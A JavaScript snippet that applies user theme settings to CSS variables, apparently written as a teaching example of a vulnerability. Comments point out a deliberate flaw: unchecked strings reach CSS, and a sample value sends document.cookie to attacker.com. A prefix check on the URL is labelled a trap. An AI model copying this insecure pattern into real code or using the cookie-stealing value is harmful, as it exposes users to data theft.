/**
 * Updates the UI theme based on user preferences stored in a JSON configuration.
 */
function applyUserTheme(themeConfig) {
  const root = document.documentElement;
  
  // themeConfig.primaryColor is expected to be a hex code or color name.
  // It is validated to be a string.
  if (typeof themeConfig.primaryColor === 'string') {
    // CROSS-DOMAIN BUG: The JS logic is 'correct' (it's a string),
    // but the CSS domain allows url() in variables.
    // If primaryColor is "url('https://attacker.com/log?c=' + document.cookie)",
    // it can lead to data exfiltration or UI redressing.
    root.style.setProperty('--theme-primary', themeConfig.primaryColor);
  }

  if (themeConfig.bgImage) {
    // Another trap: assuming the URL is safe because it starts with 'https'
    if (themeConfig.bgImage.startsWith('https://assets.example.com/')) {
       root.style.setProperty('--theme-bg-url', `url("${themeConfig.bgImage}")`);
    }
  }
}
